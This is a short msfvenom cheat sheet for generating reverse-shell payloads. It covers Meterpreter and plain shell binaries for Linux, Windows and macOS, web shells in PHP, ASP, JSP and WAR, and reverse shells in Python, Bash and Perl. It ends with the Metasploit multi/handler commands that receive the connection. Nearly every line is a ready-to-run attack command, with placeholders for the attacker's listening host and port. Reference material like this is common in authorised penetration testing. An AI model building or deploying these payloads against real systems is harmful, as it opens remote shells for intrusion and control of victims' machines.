#msfvenom cheatsheet

**Basic Format Example**
```
msfvenom -p {PAYLOAD} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} > file
```

**List all available paylods**
```
msfvenom --list payloads
```

## Binary Payloads

**Linux Meterpreter Reverse Shell**
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf > shell.elf
```

**Windows Meterpreter Reverse TCP Shell**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe
```

**Windows Reverse TCP Shell**
```
msfvenom -p windows/shell/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe
```

**Mac Reverse Shell**
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho > shell.macho
```

## Web Payloads

**PHP Meterpreter Reverse TCP**
```
msfvenom -p php/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shell.php
```

**ASP Meterpreter Reverse TCP**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f asp > shell.asp
```

**JSP Meterpreter Reverse TCP**
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shell.jsp
```

**WAR Reverse TCP**
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > shell.war
```

## Scripting Payloads

**Python Reverse TCP**
```
msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={LPORT} -f raw > shell.py
```

**Bash Unix Reverse TCP**
```
msfvenom -p cmd/unix/reverse_bash LHOST={LHOST} LPORT={LPORT} -f raw > shell.sh
```

**Perl Reverse Reverse TCP**
```
msfvenom -p cmd/unix/reverse_perl LHOST={LHOST} LPORT={LPORT} -f raw > shell.pl
```

## Retrieving the back connect

Before executing your newly created shell, make sure to run the handler so you are listening for the incoming connection.

`use exploit/multi/handler`

`set payload {PAYLOAD}`

`set LHOST {LHOST}`

`set LPORT {LPORT}`

`run`